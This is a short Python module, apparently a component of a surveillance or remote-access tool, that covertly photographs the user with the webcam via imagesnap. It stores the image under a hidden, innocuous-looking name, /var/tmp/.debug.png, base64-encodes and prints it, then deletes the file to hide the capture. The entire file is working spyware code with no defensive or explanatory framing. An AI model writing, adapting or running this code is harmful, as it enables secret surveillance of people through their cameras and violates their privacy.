# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

import subprocess

OUTPUT_FILE = "/var/tmp/.debug.png"


def run_command(command):
    out, err = subprocess.Popen(
        command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
    ).communicate()
    data = out + err
    if isinstance(data, bytes):
        return data.decode("utf-8", errors="replace")
    return data


def run(options):
    run_command("imagesnap -w 1 " + OUTPUT_FILE)
    b64 = "".join(run_command("base64 " + OUTPUT_FILE).split())
    print(b64)
    run_command("rm -rf " + OUTPUT_FILE)
